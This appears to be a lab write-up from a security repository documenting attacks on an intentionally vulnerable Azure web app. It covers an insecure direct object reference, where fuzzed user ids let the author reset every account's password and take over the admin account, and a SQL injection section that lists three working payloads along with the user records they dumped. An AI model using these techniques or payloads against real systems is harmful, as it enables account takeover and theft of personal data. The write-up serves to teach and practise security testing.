Insecure Direct Object Reference


Register Portal
```
https://appazgoat13387130-function-app.azurewebsites.net/#/register
```
![Pasted image 20240126165311](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/1fa36fdc-c7d8-4873-992d-e63e50161b93)
![Pasted image 20240126165413](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/8a959355-569e-4f24-a537-604e50f922f3)

Login Portal
```
https://appazgoat13387130-function-app.azurewebsites.net/#/login
```
![Pasted image 20240126165631](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/f282a301-f6d1-44f9-84c3-b1bed3b7367d)
![Pasted image 20240126165531](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/31adfb76-6552-4f22-ae64-d319de2c1641)


```
https://appazgoat13387130-function-app.azurewebsites.net/#/dashboard/app
```
```
After ckicking on profile. Open developer tools
```
![Pasted image 20240126170120](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/e35b68c5-b480-48a3-b69c-391966eb1ffc)

```
Send request to intruder and then fuzz the id's to see if I can change the passwords of other users. My user ckent has id 10. SUpposedly there should be 9 other users
```
![Pasted image 20240126170840](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/7986bb3b-f14b-4c18-a4c9-dcacf1f300dd)


```
Clicking on the Add button while id is selected
```
![Pasted image 20240126170959](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/2bad65dd-c578-41ea-a8e9-aacbdb7f6f0f)

```
To generate the number of ids in bash. In this instance is only 10 numbers but it could have been more

for i in {0..9}; do echo $i; done

0
1
2
3
4
5
6
7
8
9
                                  
```
![Pasted image 20240126171450](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/bdbb4861-f533-4f23-a57e-a45e4dbb8b0f)

```
un check URL-encode these characters under Payload encoding section
```
![Pasted image 20240126171550](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/529c24d2-d04e-4f7c-84fb-ea0b063b5b27)
![Pasted image 20240126172734](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/4d2933a0-32bb-4f2a-9bf2-9002db166941)

```
Users 1 to 9 have all had their passwords successfully changed
{"body": {"email": "johndoe@gmail.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "1", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "interdum.curabit@aol.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "2", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "tempor@icloud.net", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "3", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "tempus.risus@aol.net", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "4", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "orci.adipiscing@google.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "5", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "interdum.curabitur@aol.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "6", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "phasellus@aol.ca", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "7", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "test@test.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "8", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}
{"body": {"email": "bwayne@gmail.com", "newPassword": "test", "message": "Password changed successfully", "authLevel": "0", "country": "India", "id": "9", "phone": "1234567890", "username": "johndoe", "userStatus": "active"}}

```
```
I now have access to each account
johndoe@gmail.com
interdum.curabit@aol.com
tempor@icloud.net
tempus.risus@aol.net
orci.adipiscing@google.com
interdum.curabitur@aol.com
phasellus@aol.ca
test@test.com
bwayne@gmail.com
```
![[Pasted image 20240126173343.png]]
![[Pasted image 20240126173456.png]]

![[Pasted image 20240126173557.png]]```

```
I can now login as any user with their email and a password of "test"

```
![Pasted image 20240126173557](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/283576a9-252d-4917-a40f-5aecaa833527)
![Pasted image 20240126174353](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/51d332c8-96ce-4dd1-8054-1dfcb0982ea5)

```
The jwt token gives all the profile informaition about each user inclusing the name of the admin
```
![Pasted image 20240126174649](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/3dd396f7-3e00-4d93-bf1e-a94586372e70)

```
My recent logins from my brute force attempt can be seen on the dashboard. As a regular user I can only see users. All the emails for each user is obscured/masked
```
![Pasted image 20240126174904 1](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/57227098-601e-4197-a603-8ffe804e8c1e)
![Pasted image 20240126175409](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/61244919-aebe-43e5-99e8-96e83a7faa4b)

```
Logging in as the admin account allows me to see all the infromation for each user
I can confirm that im using the admin account as I can reassign the author, delete user, unban user, and ban users
```
![Pasted image 20240126175832](https://github.com/paRaade/Securing-Azure-Exploitation-and-Vulnerability-Remediation-/assets/126734769/c9ec47b9-9bc7-4c56-8308-eee7d304a586)

----------

SQL Injection
```
https://appazgoat13387130-function-app.azurewebsites.net/#/dashboard/user
```
![[Pasted image 20240126212409.png]]
![[Pasted image 20240126211305.png]]
```
Use default SQL Injection list. Uncheck URL encoding
```
![[Pasted image 20240126211401.png]]
`
```
3 of the 166 payloads reslt in a SQL Injection that extracts all the information of each user
```

```
{base}' or 7=7-- 
{base}' or 'z'='z' or 'a'='b
' or 'z'='z
```
![[Pasted image 20240126212047.png]]
![[Pasted image 20240126211927.png]]
```
{"body": [{"email": "johndoe@gmail.com", "address": "John Doe apartment, John Doe Street, Pune", "authLevel": "0", "country": "India", "id": "1", "name": "John Doe", "password": "", "phone": "1234567890", "secretAnswer": "", "secretQuestion": "", "username": "johndoe", "userStatus": "active", "creationDate": "2022-01-25T00:00:00.000Z", "_rid": "ZucZANOJih0BAAAAAAAAAA==", "_self": "dbs/ZucZAA==/colls/ZucZANOJih0=/docs/ZucZANOJih0BAAAAAAAAAA==/", "_etag": "\"63003257-0000-0100-0000-65b4314a0000\"", "_attachments": "attachments/", "_ts": 1706307914}, {"email": "interdum.curabit@aol.com", "address": "Ap #434-4703 Erat St.", "authLevel": "200", "country": "Mexico", "id": "2", "name": "Caryn Barr", "password": "", "phone": "0712376412", "secretAnswer": "", "secretQuestion": "", "username": "carynbarr", "userStatus": "active", "creationDate": "2022-04-04T00:00:00.000Z", "_rid": "ZucZANOJih0CAAAAAAAAAA==", "_self": "dbs/ZucZAA==/colls/ZucZANOJih0=/docs/ZucZANOJih0CAAAAAAAAAA==/", "_etag": "\"63003457-0000-0100-0000-65b4314a0000\"", "_attachments": "attachments/", "_ts": 1706307914}, {"email": "tempor@icloud.net", "address": "5823 Velit St.", "authLevel": "200", "country": "South Africa", "id": "3", "name": "Prescott Hensley", "password": "", "phone": "0848627138", "secretAnswer": "", "secretQuestion": "", "username": "prescotthensley", "userStatus": "active", "creationDate": "2022-03-08T00:00:00.000Z", "_rid": "ZucZANOJih0DAAAAAAAAAA==", "_self": "dbs/ZucZAA==/colls/ZucZANOJih0=/docs/ZucZANOJih0DAAAAAAAAAA==/", "_etag": "\"63003957-0000-0100-0000-65b4314b0000\"", "_attachments": "attachments/", "_ts": 1706307915}, {"email": "tempus.risus@aol.net", "address": "P.O. Box 959, 723 Lobortis St.", "authLevel": "100", "country": "India", "id": "4", "name": "Dimitry Levy", "password": "", "phone": "0227915835", "secretAnswer": "", "secretQuestion": "", "username": "dimitrylevy", "userStatus": "active", "creationDate": "2022-04-12T00:00:00.000Z", "_rid": "ZucZANOJih0EAAAAAAAAAA==", "_self": "dbs/ZucZAA==/colls/ZucZANOJih0=/docs/ZucZANOJih0EAAAAAAAAAA==/", "_etag": "\"63003757-0000-0100-0000-65b4314b0000\"", "_attachments": "attachments/", "_ts": 1706307915}, {"email": "orci.adipiscing@google.com", "address": "964-8243 Ipsum St.", "authLevel": "300", "country": "Netherlands", "id": "5", "name": "Quinn Baird", "password": "", "phone": "0617783305", "secretAnswer": "", "secretQuestion": "", "username": "quinnbaird", "userStatus": "banned", "creationDate": "2022-02-06T00:00:00.000Z", "_rid": "ZucZANOJih0FAAAAAAAAAA==", "_self": "dbs/ZucZAA==/colls/ZucZANOJih0=/docs/ZucZANOJih0FAAAAAAAAAA==/", "_etag": "\"6300be5c-0000-0100-0000-65b439440000\"", "_attachments": "attachments/", "_ts": 1706309956}, {"email": "interdum.curabitur@aol.com", "address": "Ap #434-4703 Erat St.", "authLevel": "200", "country": "Mexico", "id": "6", "name": "Raja Bauer", "password": "", "phone": "0712376712", "secretAnswer": "", "secretQuestion": "", "username": "rajabauer", "userStatus": "active", "creationDate": "2022-05-12T00:00:00.000Z", "_rid": "ZucZANOJih0GAAAAAAAAAA==", "_self": "dbs/ZucZAA==/colls/ZucZANOJih0=/docs/ZucZANOJih0GAAAAAAAAAA==/", "_etag": "\"63003357-0000-0100-0000-65b4314a0000\"", "_attachments": "attachments/", "_ts": 1706307914}, {"email": "phasellus@aol.ca", "address": "Ap #497-8828 Dolor. Street", "authLevel": "100", "country": "New Zealand", "id": "7", "name": "Connor Cantrell", "password": "", "phone": "0788887134", "secretAnswer": "", "secretQuestion": "", "username": "conorcantrell", "userStatus": "active", "creationDate": "2022-04-12T00:00:00.000Z", "_rid": "ZucZANOJih0HAAAAAAAAAA==", "_self": "dbs/ZucZAA==/colls/ZucZANOJih0=/docs/ZucZANOJih0HAAAAAAAAAA==/", "_etag": "\"63003657-0000-0100-0000-65b4314b0000\"", "_attachments": "attachments/", "_ts": 1706307915}, {"email": "test@test.com", "address": "ttttttttttttttttttt", "country": "US", "name": "test", "phone": "555-555-5555", "secretQuestion": "", "secretAnswer": "", "creationDate": "2024-01-26T19:46:43.721Z", "username": "test", "password": "", "authLevel": "300", "userStatus": "active", "id": "8", "_rid": "ZucZANOJih0IAAAAAAAAAA==", "_self": "dbs/ZucZAA==/colls/ZucZANOJih0=/docs/ZucZANOJih0IAAAAAAAAAA==/", "_etag": "\"63003d57-0000-0100-0000-65b4314b0000\"", "_attachments": "attachments/", "_ts": 1706307915}, {"email": "bwayne@gmail.com", "address": "1234 Gotham, New York", "country": "United States ", "name": "Bruce Wayne", "phone": "555-555-5555", "secretQuestion": "", "secretAnswer": "", "creationDate": "2024-01-26T21:50:42.914Z", "username": "bwayne", "password": "", "authLevel": "300", "userStatus": "active", "id": "9", "_rid": "ZucZANOJih0JAAAAAAAAAA==", "_self": "dbs/ZucZAA==/colls/ZucZANOJih0=/docs/ZucZANOJih0JAAAAAAAAAA==/", "_etag": "\"63004657-0000-0100-0000-65b4314c0000\"", "_attachments": "attachments/", "_ts": 1706307916}, {"email": "ckent@gmail.com", "address": "1234 Metropolis Avenue", "country": "United States", "name": "Clark Kent", "phone": "555-555-5555", "secretQuestion": "", "secretAnswer": "", "creationDate": "2024-01-26T21:53:18.647Z", "username": "ckent", "password": "", "authLevel": "300", "userStatus": "active", "id": "10", "_rid": "ZucZANOJih0KAAAAAAAAAA==", "_self": "dbs/ZucZAA==/colls/ZucZANOJih0=/docs/ZucZANOJih0KAAAAAAAAAA==/", "_etag": "\"63000059-0000-0100-0000-65b4335f0000\"", "_attachments": "attachments/", "_ts": 1706308447}]}
```
